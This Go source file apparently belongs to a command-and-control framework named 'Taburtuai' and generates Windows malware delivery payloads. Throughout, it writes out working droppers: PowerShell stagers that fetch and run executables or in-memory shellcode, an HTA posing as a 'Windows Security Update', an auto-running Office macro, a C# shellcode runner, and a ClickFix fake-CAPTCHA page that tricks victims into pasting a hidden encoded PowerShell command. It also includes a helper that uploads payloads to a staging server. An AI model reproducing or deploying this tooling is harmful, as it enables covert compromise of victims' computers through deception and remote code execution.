package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// ── delivery format generators ────────────────────────────────────────────────

// templatePS1Drop generates a PowerShell stager that downloads the staged
// payload using X-Stage-Token header (not URL path), drops it to %TEMP%, and
// executes it.  No binary is embedded — the stage server decrypts and serves
// plaintext bytes.
func templatePS1Drop(endpoint, token string) string {
	return fmt.Sprintf(`$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$wc = New-Object Net.WebClient
$wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
$wc.Headers['X-Stage-Token'] = '%s'
$p = [IO.Path]::Combine($env:TEMP, [IO.Path]::GetRandomFileName() + '.exe')
try { $wc.DownloadFile('%s', $p) } catch { exit }
if (-not (Test-Path $p) -or (Get-Item $p).Length -eq 0) { exit }
$s = New-Object Diagnostics.ProcessStartInfo
$s.FileName = $p
$s.WindowStyle = [Diagnostics.ProcessWindowStyle]::Hidden
$s.CreateNoWindow = $true
[Diagnostics.Process]::Start($s) | Out-Null
`, token, endpoint)
}

// templatePS1Embed drops a pre-compiled EXE (embedded as base64) to %TEMP%
// and executes it. Uses a here-string to avoid PowerShell parser stack overflows
// that occur with thousands of concatenated string literals.
func templatePS1Embed(stagerEXE []byte) string {
	b64 := base64.StdEncoding.EncodeToString(stagerEXE)
	// Split into 76-char lines — here-string, NOT concatenation, so no SOE
	var sb strings.Builder
	for i := 0; i < len(b64); i += 76 {
		end := i + 76
		if end > len(b64) {
			end = len(b64)
		}
		sb.WriteString(b64[i:end])
		sb.WriteByte('\n')
	}
	return fmt.Sprintf(`$ErrorActionPreference = 'SilentlyContinue'
$p = [IO.Path]::Combine($env:TEMP, [IO.Path]::GetRandomFileName() + '.exe')
$b64 = @"
%s"@
[IO.File]::WriteAllBytes($p, [Convert]::FromBase64String($b64 -replace '\s',''))
$s = New-Object Diagnostics.ProcessStartInfo
$s.FileName = $p
$s.WindowStyle = [Diagnostics.ProcessWindowStyle]::Hidden
$s.CreateNoWindow = $true
[Diagnostics.Process]::Start($s) | Out-Null
`, sb.String())
}

// templatePS1Shellcode generates a PowerShell stager that downloads raw shellcode
// from the C2 and executes it in-process via VirtualAlloc + CreateThread PInvoke.
func templatePS1Shellcode(endpoint, token string) string {
	return fmt.Sprintf(`# Taburtuai Stager — PS1 in-memory shellcode runner
$ErrorActionPreference = 'SilentlyContinue'
$wc = New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
$wc.Headers.Add('X-Stage-Token','%s')
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$sc = $wc.DownloadData('%s')
if ($sc.Length -eq 0) { exit }
$sig = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr sa,uint ss,IntPtr sp,IntPtr p,uint c,IntPtr t);
[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr h,int ms);
"@
$k32 = Add-Type -MemberDefinition $sig -Name 'K32' -Namespace 'Win32' -PassThru
$mem = $k32::VirtualAlloc([IntPtr]::Zero, $sc.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
$h = $k32::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
$k32::WaitForSingleObject($h, -1) | Out-Null
`, token, endpoint)
}

// templateHTA generates an HTML Application (.hta) that runs the PS1 stager.
func templateHTA(endpoint, token string, stagerEXE []byte) string {
	var ps1 string
	if endpoint != "" {
		ps1 = templatePS1Drop(endpoint, token)
	} else {
		ps1 = templatePS1Embed(stagerEXE)
	}
	ps1B64 := base64.StdEncoding.EncodeToString([]byte(ps1))
	return fmt.Sprintf(`<html>
<head><title>Windows Security Update</title></head>
<body>
<script language="VBScript">
Sub RunStager()
  Dim ps1B64 : ps1B64 = "%s"
  Dim oSh : Set oSh = CreateObject("WScript.Shell")
  Dim cmd : cmd = "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand " & ps1B64
  oSh.Run cmd, 0, False
  Set oSh = Nothing
End Sub
RunStager
Self.Close
</script>
<p style="font-family:Segoe UI">Applying security update, please wait...</p>
</body>
</html>
`, base64.StdEncoding.EncodeToString([]byte(
		"powershell -w hidden -c \""+
			`[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('`+
			ps1B64+`')) | IEX`+"\"")))
}

// templateVBA generates an Office VBA macro that downloads and runs the stager.
func templateVBA(endpoint, token string) string {
	return fmt.Sprintf(`' Taburtuai Stager — VBA macro dropper
' Insert into: Developer > Visual Basic > Insert Module
' Trigger: Auto_Open / Workbook_Open / Document_Open

Sub Auto_Open()
    Call RunStager
End Sub

Sub Document_Open()
    Call RunStager
End Sub

Sub Workbook_Open()
    Call RunStager
End Sub

Private Sub RunStager()
    Dim url As String : url = "%s"
    Dim tok As String : tok = "%s"
    Dim tmp As String
    tmp = Environ("TEMP") & "\" & "upd" & Format(Now(), "HHMMSS") & ".exe"

    ' Download via XMLHTTP
    Dim xhr As Object
    Set xhr = CreateObject("MSXML2.XMLHTTP")
    xhr.Open "GET", url, False
    xhr.setRequestHeader "X-Stage-Token", tok
    xhr.Send

    If xhr.Status = 200 Then
        ' Write bytes to temp file
        Dim ado As Object
        Set ado = CreateObject("ADODB.Stream")
        ado.Type = 1 ' adTypeBinary
        ado.Open
        ado.Write xhr.responseBody
        ado.SaveToFile tmp, 2
        ado.Close

        ' Execute silently
        Dim wsh As Object
        Set wsh = CreateObject("WScript.Shell")
        wsh.Run Chr(34) & tmp & Chr(34), 0, False
    End If
End Sub
`, endpoint, token)
}

// templateCS generates C# source code that runs shellcode via PInvoke.
func templateCS(endpoint, token string) string {
	return fmt.Sprintf(`// Taburtuai Stager — C# shellcode runner
// Compile: csc /unsafe /out:stager.exe stager.cs
// Requires: .NET Framework 4.0+
using System;
using System.Net;
using System.Runtime.InteropServices;

class Program {
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr sa, uint ss, IntPtr sp, IntPtr p, uint c, IntPtr t);
    [DllImport("kernel32.dll")] static extern int WaitForSingleObject(IntPtr h, int ms);

    static void Main() {
        ServicePointManager.ServerCertificateValidationCallback += (s, c, ch, e) => true;
        var wc = new WebClient();
        wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        wc.Headers.Add("X-Stage-Token", "%s");
        byte[] sc;
        try { sc = wc.DownloadData("%s"); } catch { return; }
        if (sc.Length == 0) return;
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, mem, sc.Length);
        IntPtr t = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(t, -1);
    }
}
`, token, endpoint)
}

// ── ClickFix / social engineering templates ───────────────────────────────────

// templateClickFix generates a ClickFix-style lure.
// The victim is shown a fake CAPTCHA/verification page and told to:
//   1. Press Win+R
//   2. Paste the command
//   3. Press Enter
func templateClickFix(stagerEXE []byte, lure string) string {
	ps1 := templatePS1Embed(stagerEXE)
	// Encode to avoid quote issues in the Run dialog
	ps1B64 := base64.StdEncoding.EncodeToString([]byte(ps1))
	runCmd := fmt.Sprintf(`powershell -w hidden -ep bypass -enc %s`, ps1B64)

	if lure == "" {
		lure = "Security Verification Required"
	}

	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>%s</title>
<style>
body{font-family:'Segoe UI',sans-serif;background:#f3f3f3;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#fff;border-radius:8px;padding:32px 40px;box-shadow:0 2px 12px rgba(0,0,0,.15);max-width:480px;width:100%%;text-align:center}
.logo{font-size:48px;margin-bottom:16px}
h2{margin:0 0 8px;color:#1a1a1a}
p{color:#555;margin:0 0 20px;line-height:1.5}
.steps{text-align:left;background:#f8f8f8;border-radius:6px;padding:16px 20px;margin-bottom:20px}
.steps li{margin:8px 0;color:#333}
.cmd-box{background:#1e1e1e;color:#d4d4d4;font-family:monospace;font-size:13px;padding:12px 16px;border-radius:4px;word-break:break-all;cursor:pointer;user-select:all;margin-bottom:16px}
.btn{background:#0078d4;color:#fff;border:none;padding:12px 32px;border-radius:4px;font-size:15px;cursor:pointer;width:100%%}
.btn:hover{background:#006cbf}
</style>
</head>
<body>
<div class="box">
  <div class="logo">🔒</div>
  <h2>%s</h2>
  <p>To verify you are human, complete the following steps:</p>
  <div class="steps">
    <ol>
      <li>Press <strong>Windows key + R</strong> to open the Run dialog</li>
      <li>Click the command below to copy it</li>
      <li>Paste it in the Run dialog and press <strong>Enter</strong></li>
    </ol>
  </div>
  <div class="cmd-box" onclick="copyCmd(this)" title="Click to copy">%s</div>
  <button class="btn" onclick="copyCmd(document.querySelector('.cmd-box'))">📋 Copy Command</button>
  <p style="margin-top:16px;font-size:12px;color:#999">This verification expires in 5 minutes.</p>
</div>
<script>
function copyCmd(el){
  navigator.clipboard.writeText(el.innerText).catch(function(){
    var r=document.createRange();r.selectNode(el);
    window.getSelection().removeAllRanges();
    window.getSelection().addRange(r);
    document.execCommand('copy');
    window.getSelection().removeAllRanges();
  });
  el.style.outline='2px solid #0078d4';
  setTimeout(function(){el.style.outline=''},800);
}
</script>
</body>
</html>
`, lure, lure, runCmd)
}

// ── upload helper ─────────────────────────────────────────────────────────────

func uploadStage(server, apiKey string, data []byte, format, arch string, ttl int, desc string) (token, stageURL string, err error) {
	body := map[string]interface{}{
		"payload_b64": base64.StdEncoding.EncodeToString(data),
		"format":      format,
		"arch":        arch,
		"os":          "windows",
		"ttl_hours":   ttl,
		"description": desc,
	}
	raw, _ := json.Marshal(body)

	req, err := http.NewRequest("POST", strings.TrimRight(server, "/")+"/api/v1/stage", bytes.NewReader(raw))
	if err != nil {
		return "", "", err
	}
	req.Header.Set("Content-Type", "application/json")
	if apiKey != "" {
		req.Header.Set("Authorization", "Bearer "+apiKey)
	}

	client := &http.Client{Timeout: 60 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()

	respBytes, _ := io.ReadAll(resp.Body)

	var result struct {
		Success bool `json:"success"`
		Data    struct {
			Token     string `json:"token"`
			StageURL  string `json:"stage_url"`
		} `json:"data"`
		Error string `json:"error"`
	}
	if err := json.Unmarshal(respBytes, &result); err != nil {
		return "", "", fmt.Errorf("parse response: %w", err)
	}
	if !result.Success {
		return "", "", fmt.Errorf("server error: %s", result.Error)
	}
	return result.Data.Token, result.Data.StageURL, nil
}
